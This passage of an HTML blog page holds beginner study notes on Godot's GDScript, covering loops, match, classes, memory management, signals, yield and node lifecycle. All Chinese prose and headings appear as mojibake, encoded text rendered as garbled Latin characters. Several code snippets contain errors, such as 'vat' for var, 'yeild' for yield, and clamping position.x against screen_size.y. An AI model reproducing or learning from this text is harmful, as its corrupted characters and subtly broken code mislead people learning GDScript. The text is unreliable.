class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>å‡½æ•°ä½“ä¸ºç©ºåˆ™ç”¨ <code>pass</code> å…³é”®å­—:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">func_name</span><span class="hljs-params">(parameters)</span>:<br>    pass<br></code></pre></td></tr></table></figure><h1 id="4-å˜é‡ä½œç”¨åŸŸ"><a href="#4-å˜é‡ä½œç”¨åŸŸ" class="headerlink" title="4. å˜é‡ä½œç”¨åŸŸ"></a>4. å˜é‡ä½œç”¨åŸŸ</h1><p>å‡½æ•°å†…å®šä¹‰æ˜¯å±€éƒ¨.</p><p>å¤–éƒ¨å®šä¹‰æ˜¯å…¨å±€.</p><h1 id="5-è¿ç®—ç¬¦"><a href="#5-è¿ç®—ç¬¦" class="headerlink" title="5. è¿ç®—ç¬¦"></a>5. è¿ç®—ç¬¦</h1><p>å’Œ C è¯­è¨€åŸºæœ¬ç›¸åŒ.</p><p>GDScript çš„æ‰€æœ‰è¿ç®—æ˜¯å’Œ C++ å¯¹åº”çš„.</p><h1 id="6-æ¡ä»¶è¯­å¥"><a href="#6-æ¡ä»¶è¯­å¥" class="headerlink" title="6. æ¡ä»¶è¯­å¥"></a>6. æ¡ä»¶è¯­å¥</h1><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">if</span> (condition):<br>    <span class="hljs-params">...</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (condition):<br>    <span class="hljs-params">...</span> <br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p><code>match</code> è¯­å¥ï¼Œå’Œ C ä¸­çš„ <code>switch</code> ç±»ä¼¼:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">vat</span> <span class="hljs-variable">local_var</span> = <span class="hljs-number">5</span><br><br><span class="hljs-variable">match</span> <span class="hljs-variable">local_var</span>:<br>    <span class="hljs-number">1</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match1&quot;</span>)</span><br>    <span class="hljs-number">2</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match2&quot;</span>)</span><br>    <span class="hljs-number">5</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match5&quot;</span>)</span><br>    <span class="hljs-number">6</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match6&quot;</span>)</span><br>    <span class="hljs-variable">_</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;match_&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤ <code>default</code> è¿™é‡Œå†™æˆä¸‹åˆ’çº¿ <code>_</code></p><p>å¯ä»¥åŠ ä¸Š <code>continue</code> è¯­å¥.</p><h1 id="7-å¾ªç¯"><a href="#7-å¾ªç¯" class="headerlink" title="7. å¾ªç¯"></a>7. å¾ªç¯</h1><p><code>for</code> è¯­å¥:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-function"><span class="hljs-title">range</span>(<span class="hljs-number">20</span>):</span><br><span class="hljs-function">    <span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span><br></code></pre></td></tr></table></figure><p><code>while</code> è¯­å¥:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">while</span> param != <span class="hljs-number">0</span>:<br>    <span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><p>ä¼¼ä¹å¯ä»¥åŠ æ‹¬å·.</p><p>æœ‰ <code>break</code> å’Œ <code>continue</code>.</p><h1 id="8-æ•°ç»„"><a href="#8-æ•°ç»„" class="headerlink" title="8. æ•°ç»„"></a>8. æ•°ç»„</h1><p>ç”¨ <code>[]</code> åŒ…è£¹:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> arr = <span class="hljs-selector-attr">[0, 1, 2]</span><br></code></pre></td></tr></table></figure><p><code>range(3)</code> è¿”å›çš„æ˜¯:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[0, 1, 2]</span><br></code></pre></td></tr></table></figure><p>å­—å…¸ç”¨ <code>&#123;&#125;</code> åŒ…è£¹. æœ‰ <code>keys</code> å’Œ <code>values</code> æ–¹æ³•:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">dic.keys<span class="hljs-comment">()</span><br>dic.values<span class="hljs-comment">()</span><br></code></pre></td></tr></table></figure><h1 id="9-é™æ€å˜é‡å’Œé™æ€æ–¹æ³•"><a href="#9-é™æ€å˜é‡å’Œé™æ€æ–¹æ³•" class="headerlink" title="9. é™æ€å˜é‡å’Œé™æ€æ–¹æ³•"></a>9. é™æ€å˜é‡å’Œé™æ€æ–¹æ³•</h1><p><code>const</code> å…³é”®å­—.</p><p>å¦‚:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">const LEN <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>åœ¨é™æ€æ–¹æ³•ä¸­åªèƒ½è®¿é—®é™æ€å¸¸é‡, ç”¨ <code>static</code> å…³é”®å­—:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>:<br>    <span class="hljs-keyword">return</span> LEN<br></code></pre></td></tr></table></figure><h1 id="10-å¯¹è±¡"><a href="#10-å¯¹è±¡" class="headerlink" title="10. å¯¹è±¡"></a>10. å¯¹è±¡</h1><p>ä½¿ç”¨ <code>class</code> å…³é”®å­—ï¼Œç±»åé¦–å­—æ¯ä¸€èˆ¬å¤§å†™, åˆ›å»ºçš„ç±»ä¸€èˆ¬é»˜è®¤ç»§æ‰¿ <code>Objects</code> ç±».</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">Animal:</span><br><span class="hljs-symbol">    <span class="hljs-symbol">extends</span></span> <span class="hljs-symbol">Objects</span><br><br>    <span class="hljs-symbol">func</span> <span class="hljs-symbol">_init</span>():<br>        <span class="hljs-symbol">print</span>(&quot;<span class="hljs-symbol">Construct</span>&quot;)<br></code></pre></td></tr></table></figure><p><code>_init()</code> æ–¹æ³•åœ¨åˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è¿è¡Œ.</p><p>å¯é‡å†™çˆ¶ç±»çš„æ–¹æ³•.</p><p>æ„é€ ä¸€ä¸ªå¯¹è±¡ç”¨ <code>new</code> å…³é”®è¯:</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> dog = Dog.<span class="hljs-keyword">new</span><span class="hljs-type"></span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>åœ¨å­ç±»ä¸­è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³• (åœ¨å­ç±»ä¸­é‡å†™è¿‡):</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dos">func <span class="hljs-built_in">move</span>():<br>    <span class="hljs-built_in">print</span>(&quot;Child <span class="hljs-built_in">move</span>&quot;)<br>    .<span class="hljs-built_in">move</span>() # Parent&#x27;s <span class="hljs-built_in">move</span><br></code></pre></td></tr></table></figure><h1 id="11-è°ƒè¯•"><a href="#11-è°ƒè¯•" class="headerlink" title="11. è°ƒè¯•"></a>11. è°ƒè¯•</h1><h1 id="12-æ€§èƒ½ç»Ÿè®¡"><a href="#12-æ€§èƒ½ç»Ÿè®¡" class="headerlink" title="12. æ€§èƒ½ç»Ÿè®¡"></a>12. æ€§èƒ½ç»Ÿè®¡</h1><p>ä¸‹é¢è¾¹æ çš„ Profile.</p><h1 id="13-ç›‘è§†å™¨-Monitor"><a href="#13-ç›‘è§†å™¨-Monitor" class="headerlink" title="13. ç›‘è§†å™¨ Monitor"></a>13. ç›‘è§†å™¨ Monitor</h1><h1 id="14-å†…å­˜ç®¡ç†"><a href="#14-å†…å­˜ç®¡ç†" class="headerlink" title="14. å†…å­˜ç®¡ç†"></a>14. å†…å­˜ç®¡ç†</h1><p>Reference å¯¹è±¡è‡ªåŠ¨å›æ”¶. ä¸èƒ½ä½¿ç”¨ <code>free()</code> æ–¹æ³•.</p><p>å…¶ä»–çš„éœ€è¦ç”¨ <code>free()</code> æ–¹æ³•é‡Šæ”¾. æ³¨æ„å’Œ <code>queue_free()</code> çš„åŒºåˆ«ï¼Œåè€…æ˜¯å°†å¯¹è±¡å…ˆæ”¾åœ¨å¯¹è±¡ä¸­ï¼Œç„¶ååœ¨æŸä¸ªèŠ‚ç‚¹ç»Ÿä¸€é‡Šæ”¾. ä¼˜å…ˆä½¿ç”¨åè€….</p><h1 id="15-åƒåœ¾å›æ”¶çš„ç¼ºç‚¹"><a href="#15-åƒåœ¾å›æ”¶çš„ç¼ºç‚¹" class="headerlink" title="15. åƒåœ¾å›æ”¶çš„ç¼ºç‚¹"></a>15. åƒåœ¾å›æ”¶çš„ç¼ºç‚¹</h1><p>è®©ç¨‹åºå˜æ…¢.</p><p>æ²¡æœ‰åƒåœ¾å›æ”¶ä¼šæœ‰å†…å­˜æ³„æ¼çš„é£é™©.</p><h1 id="16-å¼•ç”¨è®¡æ•°ç®—æ³•"><a href="#16-å¼•ç”¨è®¡æ•°ç®—æ³•" class="headerlink" title="16. å¼•ç”¨è®¡æ•°ç®—æ³•"></a>16. å¼•ç”¨è®¡æ•°ç®—æ³•</h1><p>åˆ›å»ºçš„å¯¹è±¡éƒ½æœ‰ä¸ä¹‹å…³è”çš„è®¡æ•°å™¨. è®°å½•å¼•ç”¨çš„æ•°é‡.</p><h1 id="17-é€šè¿‡è„šæœ¬æ“ä½œèŠ‚ç‚¹"><a href="#17-é€šè¿‡è„šæœ¬æ“ä½œèŠ‚ç‚¹" class="headerlink" title="17. é€šè¿‡è„šæœ¬æ“ä½œèŠ‚ç‚¹"></a>17. é€šè¿‡è„šæœ¬æ“ä½œèŠ‚ç‚¹</h1><p>å¯ä»¥é€šè¿‡è„šæœ¬ç›´æ¥åˆ›å»ºå’Œæ·»åŠ èŠ‚ç‚¹ï¼Œè€Œä¸ç”¨æ‰‹åŠ¨ç‚¹å‡»æ·»åŠ .</p><p>å¦‚:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">func <span class="hljs-constructor">_ready()</span>:<br>    var sprite = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Sprite</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-literal">()</span><br>    add<span class="hljs-constructor">_child(<span class="hljs-params">sprite</span>)</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œæ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚åœ¨ç¼–è¾‘å™¨ä¸­èƒ½å¤Ÿåšåˆ°çš„ï¼Œåœ¨ä»£ç ä¸­ä¹Ÿèƒ½å¤Ÿåšåˆ°.</p><h1 id="18-åœºæ™¯æ ‘"><a href="#18-åœºæ™¯æ ‘" class="headerlink" title="18. åœºæ™¯æ ‘"></a>18. åœºæ™¯æ ‘</h1><p>ç¬¬ä¸€ä¸ªèŠ‚ç‚¹æ˜¯ root èŠ‚ç‚¹ (å³æ ¹èŠ‚ç‚¹), å¯ä»¥åœ¨å·¦è¾¹æ çš„ Remote ä¸­çœ‹åˆ°ï¼Œlocal ä¸­çš„èŠ‚ç‚¹å®é™…ä¸Šä¼šåœ¨è¿è¡Œæ—¶æŒ‚è½½åˆ° root èŠ‚ç‚¹ä¸Š.</p><h1 id="19-å¸§ç‡"><a href="#19-å¸§ç‡" class="headerlink" title="19. å¸§ç‡"></a>19. å¸§ç‡</h1><p>FPS, Frames Per Second, ä¹‹å›¾ç‰‡æ¯å¤šå°‘ç§’åˆ·æ–°ä¸€æ¬¡ã€‚</p><p>ä½¿ç”¨ä»£ç è®¾ç½®å¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">Engine.target_fps</span> = <span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>delta æŒ‡çš„æ˜¯ä¸¤å¸§ä¹‹é—´çš„æ—¶é—´å·®.</p><h1 id="20-èŠ‚ç‚¹activeç”Ÿå‘½å‘¨æœŸ"><a href="#20-èŠ‚ç‚¹activeç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="20. èŠ‚ç‚¹activeç”Ÿå‘½å‘¨æœŸ"></a>20. èŠ‚ç‚¹activeç”Ÿå‘½å‘¨æœŸ</h1><p>ä»èŠ‚ç‚¹æ ‘ä¸Šå¾€ä¸‹è¿è¡Œ.</p><p>è¿è¡Œé¡ºåº: <code>_enter_tree()</code> -&gt; <code>_ready()</code> -&gt; <code>_process()</code> -&gt; <code>_exit_tree()</code></p><h1 id="21-èŠ‚ç‚¹inactiveç”Ÿå‘½å‘¨æœŸ-ç§»é™¤èŠ‚ç‚¹"><a href="#21-èŠ‚ç‚¹inactiveç”Ÿå‘½å‘¨æœŸ-ç§»é™¤èŠ‚ç‚¹" class="headerlink" title="21. èŠ‚ç‚¹inactiveç”Ÿå‘½å‘¨æœŸ(ç§»é™¤èŠ‚ç‚¹)"></a>21. èŠ‚ç‚¹inactiveç”Ÿå‘½å‘¨æœŸ(ç§»é™¤èŠ‚ç‚¹)</h1><p>åˆ é™¤èŠ‚ç‚¹æ—¶æ˜¯ä»ä¸‹å¾€ä¸Šåˆ é™¤.</p><h1 id="22-èŠ‚ç‚¹çš„è·å–æ–¹å¼"><a href="#22-èŠ‚ç‚¹çš„è·å–æ–¹å¼" class="headerlink" title="22. èŠ‚ç‚¹çš„è·å–æ–¹å¼"></a>22. èŠ‚ç‚¹çš„è·å–æ–¹å¼</h1><p>åœ¨ä»£ç ä¸­è·å–ä¸€ä¸ªèŠ‚ç‚¹.</p><p>ä½ çš„è„šæœ¬æŒ‚è½½åˆ°å“ªä¸€ä¸ªèŠ‚ç‚¹ï¼Œ<code>self</code> å°±æŒ‡ä»£å“ªä¸€ä¸ªèŠ‚ç‚¹.</p><p>å¦‚:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-keyword">var</span> currentNode1 = $<span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-keyword">var</span> currentNode2 = <span class="hljs-variable language_">self</span><br></code></pre></td></tr></table></figure><p><code>get_node()</code> å‡½æ•°ï¼Œåƒæ–‡ä»¶è·¯å¾„ä¸€æ ·è·å–èŠ‚ç‚¹.</p><p>ç›´æ¥æ‰“å°ä¸€ä¸ªèŠ‚ç‚¹æ—¶ï¼Œæ‰“å°çš„æ˜¯èŠ‚ç‚¹çš„ Hash å€¼:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-variable">$Node</span>)</span></span><br></code></pre></td></tr></table></figure><p>æ‰“å°èŠ‚ç‚¹åç§°ç”¨:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-variable">$Node</span>.name)</span></span><br></code></pre></td></tr></table></figure><p>åœ¨å˜é‡å£°æ˜ä¸­ (è¿™é‡ŒæŒ‡æ‰€æœ‰å‡½æ•°ä¹‹å¤–) è·å–ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ <code>var node = $Node</code> éœ€è¦åŠ ä¸Š <code>onready</code> å…³é”®å­—. å› ä¸º <code>$</code> è¿™ç§å†™æ³•åªèƒ½å‡ºç°åœ¨å‡½æ•°å†…ï¼Œä½¿ç”¨ <code>onready</code> å°±ç›¸å½“äºåœ¨ <code>_ready()</code> è¿™ä¸ªå‡½æ•°ä¸­è¿è¡Œ.</p><h1 id="23-æ¸²æŸ“å¸§å’Œç‰©ç†å¸§-processå’Œphysics-process"><a href="#23-æ¸²æŸ“å¸§å’Œç‰©ç†å¸§-processå’Œphysics-process" class="headerlink" title="23. æ¸²æŸ“å¸§å’Œç‰©ç†å¸§(processå’Œphysics_process)"></a>23. æ¸²æŸ“å¸§å’Œç‰©ç†å¸§(processå’Œphysics_process)</h1><p><code>_process()</code> æ˜¯åœ¨ delta time é—´éš”ä¹‹é—´æ‰§è¡Œçš„. ä¹Ÿå°±æ˜¯è¯´ï¼Œä»£ç åœ¨æ¯ä¸€å¸§ä¹‹å‰æ‰§è¡Œ.</p><p><code>_process()</code> ç”¨äºå®æ—¶ååº”.</p><p>å¯ä»¥ç”¨  <code>_physics_process</code> åšè®¡æ—¶çš„é€»è¾‘.</p><h1 id="24-parentå’Œowner"><a href="#24-parentå’Œowner" class="headerlink" title="24. parentå’Œowner"></a>24. parentå’Œowner</h1><p>owner æ˜¯é¡¶éƒ¨èŠ‚ç‚¹ï¼Œé¡¶éƒ¨èŠ‚ç‚¹çš„ owner æ˜¯ null. <code>owner</code> å¯ç›´æ¥ä½¿ç”¨. å¯ä»¥ç®—ä¸€ä¸ªé¢„å¯¹è±¡.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(owner.name)</span></span><br></code></pre></td></tr></table></figure><h1 id="25-ä¿¡å·signal"><a href="#25-ä¿¡å·signal" class="headerlink" title="25. ä¿¡å·signal"></a>25. ä¿¡å·signal</h1><p>Godot å®˜æ–¹å»ºè®®åœ¨å¼€å‘ä¸­æ›´å¤šçš„ä½¿ç”¨ä¿¡å·æ¥å®Œæˆæ¨¡å—é—´çš„é€šä¿¡.</p><p>è§¦å‘ä¿¡å·æ‰§è¡Œä¸€ä¸ªå‡½æ•°.</p><p>ä½¿ç”¨ä»£ç æ§åˆ¶ä¿¡å·:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">connect</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>æ‰€æœ‰çš„å¯¹è±¡éƒ½æœ‰ <code>connect()</code> æ–¹æ³•ï¼Œå› ä¸ºæ‰€æœ‰çš„å¯¹è±¡éƒ½ç»§æ‰¿äº Object å¯¹è±¡ï¼Œ<code>connect()</code> æ˜¯ Object å¯¹è±¡çš„æˆå‘˜å‡½æ•°.</p><h1 id="26-è‡ªå®šä¹‰ä¿¡å·"><a href="#26-è‡ªå®šä¹‰ä¿¡å·" class="headerlink" title="26. è‡ªå®šä¹‰ä¿¡å·"></a>26. è‡ªå®šä¹‰ä¿¡å·</h1><p><code>emit_signal</code> ä¹Ÿæ˜¯ Object å¯¹è±¡çš„æˆå‘˜å‡½æ•°.</p><p>è‡ªå®šä¹‰ä¿¡å·å‚æ•°çš„ä½¿ç”¨ ã€‚</p><h1 id="27-å¼‚æ­¥å›è°ƒyield"><a href="#27-å¼‚æ­¥å›è°ƒyield" class="headerlink" title="27. å¼‚æ­¥å›è°ƒyield"></a>27. å¼‚æ­¥å›è°ƒyield</h1><p>ç¬¬ä¸€ç§ä½¿ç”¨:<br><code>yeild()</code> ç”¨æ¥æŒ‚èµ·ã€‚å…¶äº§ç”Ÿçš„è¿”å›å€¼å­˜å‚¨åœ¨ä¸€ä¸ªåœ°æ–¹.</p><p><code>resume()</code> ç”¨æ¥æ¢å¤.</p><p>ä¸€èˆ¬ä»£ç çš„æ‰§è¡Œï¼Œå¦‚ä¸€ä¸ªå‡½æ•°, æ˜¯ç­‰åˆ°å…¶è¿”å›äº†ä¹‹åæ‰æ‰§è¡Œä¸‹ä¸€è¡Œä»£ç ï¼Œè€Œä½¿ç”¨ <code>yeild()</code> åˆ™ä¸éœ€è¦ç­‰å¾….</p><p>ç¬¬äºŒç§ä½¿ç”¨ï¼Œç”¨ä¿¡å·åˆ¤æ–­æ¢å¤. ç›‘å¬æŸä¸€ä¸ªèŠ‚ç‚¹çš„æŸä¸€ä¸ªä¿¡å·.</p><p>ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œåˆ©ç”¨ <code>yeild()</code> ç»“æŸæ—¶ä¼šé‡Šæ”¾çš„ <code>completed</code> ä¿¡å·.</p><h1 id="28-å¤šçº¿ç¨‹"><a href="#28-å¤šçº¿ç¨‹" class="headerlink" title="28. å¤šçº¿ç¨‹"></a>28. å¤šçº¿ç¨‹</h1><p>ä½¿ç”¨å†…éƒ¨çš„ç±» <code>Thread</code>.</p><p>ä¸€ä¸ªçº¿ç¨‹ä¼šåˆ†é…åˆ°ä¸€ä¸ª CPU çš„æ ¸å¿ƒä¸­è¿ç®—.</p><p>æ•°æ®ä¸ä¸€è‡´é—®é¢˜åˆ©ç”¨é”è§£å†³.</p><h1 id="29-å±å¹•çª—å£è®¾ç½®"><a href="#29-å±å¹•çª—å£è®¾ç½®" class="headerlink" title="29. å±å¹•çª—å£è®¾ç½®"></a>29. å±å¹•çª—å£è®¾ç½®</h1><p>æ¯å±å¯è®¾ç½®.</p><h1 id="30-å•ä½å’Œåƒç´ "><a href="#30-å•ä½å’Œåƒç´ " class="headerlink" title="30. å•ä½å’Œåƒç´ "></a>30. å•ä½å’Œåƒç´ </h1><p>å±å¹•åˆ†è¾¨ç‡ (å±å¹•åƒç´ ), å±å¹•ä¸Šçš„åƒç´ ç‚¹æ•°.</p><p>å›¾ç‰‡åƒç´ .</p><p>åœ¨ Godot ä¸­, ä¸€èˆ¬ position çš„ 1 ä¸ªå•ä½é•¿åº¦ç­‰äº 1 ä¸ªå›¾ç‰‡åƒç´ .</p><h1 id="31-å‚ç›´åŒæ­¥"><a href="#31-å‚ç›´åŒæ­¥" class="headerlink" title="31. å‚ç›´åŒæ­¥"></a>31. å‚ç›´åŒæ­¥</h1><p>Vertical Sync. åœ¨ Godot ä¸­é»˜è®¤å¼€å¯.</p><p>å‚ç›´åŒæ­¥çš„ä¿¡å·æ˜¯ç”±æ˜¾ç¤ºå™¨å‘å‡º. é€å…¥æ˜¾å¡ 3D å›¾å½¢å¤„ç†éƒ¨åˆ†</p><h1 id="32-å±å¹•åæ ‡"><a href="#32-å±å¹•åæ ‡" class="headerlink" title="32. å±å¹•åæ ‡"></a>32. å±å¹•åæ ‡</h1><p>å±å¹•åæ ‡ç³»çš„åŸç‚¹åœ¨å·¦ä¸Šè§’. å› ä¸ºä»¥å‰ CRT æ˜¾åƒç®¡æ˜¯ä»å·¦ä¸Šè§’å¼€å§‹æ‰«æçš„.</p><h1 id="33-å…¨å±€å’Œç›¸å¯¹åæ ‡çš„ç›¸äº’è½¬åŒ–"><a href="#33-å…¨å±€å’Œç›¸å¯¹åæ ‡çš„ç›¸äº’è½¬åŒ–" class="headerlink" title="33. å…¨å±€å’Œç›¸å¯¹åæ ‡çš„ç›¸äº’è½¬åŒ–"></a>33. å…¨å±€å’Œç›¸å¯¹åæ ‡çš„ç›¸äº’è½¬åŒ–</h1><p><code>position</code> å±æ€§æ˜¯è¯¥èŠ‚ç‚¹ç›¸å¯¹äºçˆ¶èŠ‚ç‚¹çš„ç›¸å¯¹ä½ç½®.</p><p><code>global_position</code> æ˜¯å…¨å±€ä½ç½® (å³ä¸ root æ ¹èŠ‚ç‚¹çš„ç›¸å¯¹ä½ç½®).</p><h1 id="34-æ·±åº¦éå†æ˜¾ç¤ºèŠ‚ç‚¹"><a href="#34-æ·±åº¦éå†æ˜¾ç¤ºèŠ‚ç‚¹" class="headerlink" title="34. æ·±åº¦éå†æ˜¾ç¤ºèŠ‚ç‚¹"></a>34. æ·±åº¦éå†æ˜¾ç¤ºèŠ‚ç‚¹</h1><p>Godot ä¸­çš„æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯åœºæ™¯. </p><p>åœºæ™¯ä¹‹ä¸‹ä¹Ÿå¯ä»¥æŒ‚è½½åœºæ™¯.</p><h1 id="35-SpriteèŠ‚ç‚¹å’ŒImageç±»çš„ä½¿ç”¨"><a href="#35-SpriteèŠ‚ç‚¹å’ŒImageç±»çš„ä½¿ç”¨" class="headerlink" title="35. SpriteèŠ‚ç‚¹å’ŒImageç±»çš„ä½¿ç”¨"></a>35. SpriteèŠ‚ç‚¹å’ŒImageç±»çš„ä½¿ç”¨</h1><p>æ‰€æœ‰çš„ 2D èŠ‚ç‚¹å’Œ GUI èŠ‚ç‚¹éƒ½ç»§æ‰¿äº CanvasItem èŠ‚ç‚¹ã€‚</p><p>å³è¾¹æ ä¸­å¯ä»¥åˆ¤æ–­å‡ºè¿™ä¸ªèŠ‚ç‚¹æ˜¯ç»§æ‰¿äºé‚£äº›èŠ‚ç‚¹.</p><p>å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­ä¿å­˜å›¾ç‰‡.</p><p>Image ç±»å¯ä»¥ç›´æ¥æ“ä½œåŸå§‹çš„å›¾ç‰‡.</p><h1 id="36-å‘é‡çš„åŸºç¡€"><a href="#36-å‘é‡çš„åŸºç¡€" class="headerlink" title="36. å‘é‡çš„åŸºç¡€"></a>36. å‘é‡çš„åŸºç¡€</h1><p>å‘é‡ï¼Œæœ‰æ–¹å‘çš„é‡.</p><p>å¯ç›´æ¥è·å–å‘é‡çš„é•¿åº¦, ä½¿ç”¨ <code>length()</code> æ–¹æ³•.</p><p><code>normalize()</code> è½¬åŒ–ä¸ºå•ä½å‘é‡.</p><p>æœ‰å‘é‡ç‚¹ç§¯å’Œå·®ç§¯çš„ç®—æ³•, ä½¿ç”¨ <code>dot()</code> å’Œ <code>cross()</code> æ–¹æ³•.</p><p>å¯ç›´æ¥è¿”å›ä¸¤ä¸ªå‘é‡çš„å¤¹è§’ï¼Œä½¿ç”¨ <code>angle_to()</code> æ–¹æ³•.</p><h1 id="37-é€šè¿‡è¾“å…¥äº‹ä»¶æ¥æ§åˆ¶ç‰©ä½“ç§»åŠ¨"><a href="#37-é€šè¿‡è¾“å…¥äº‹ä»¶æ¥æ§åˆ¶ç‰©ä½“ç§»åŠ¨" class="headerlink" title="37. é€šè¿‡è¾“å…¥äº‹ä»¶æ¥æ§åˆ¶ç‰©ä½“ç§»åŠ¨"></a>37. é€šè¿‡è¾“å…¥äº‹ä»¶æ¥æ§åˆ¶ç‰©ä½“ç§»åŠ¨</h1><p>å¦‚ï¼Œå°†é¼ æ ‡ï¼Œé”®ç›˜ï¼Œè§¦æ§ç­‰ï¼Œä»¥äº‹ä»¶çš„å½¢å¼å‘é€åˆ°åº”ç”¨ç¨‹åº.</p><p>è·å–å¯è§†ç•Œé¢çš„å¤§å°:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">screen_size</span> = get_viewport_rect().size<br></code></pre></td></tr></table></figure><p>é™åˆ¶åœ¨å¯è§†ç•Œé¢ä¸­:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">position.x = <span class="hljs-built_in">clamp</span>(position.x, <span class="hljs-number">0</span>, screen_size.y)<br>position.y = <span class="hljs-built_in">clamp</span>(position.y, <span class="hljs-number">0</span>, screen_size.y)<br><br></code></pre></td></tr></table></figure><p>Project Setting -&gt; Input Map ä¸­çš„éƒ½æ˜¯äº‹ä»¶ã€‚</p><h1 id="38-ç‰©ç†ç³»ç»Ÿ"><a href="#38-ç‰©ç†ç³»ç»Ÿ" 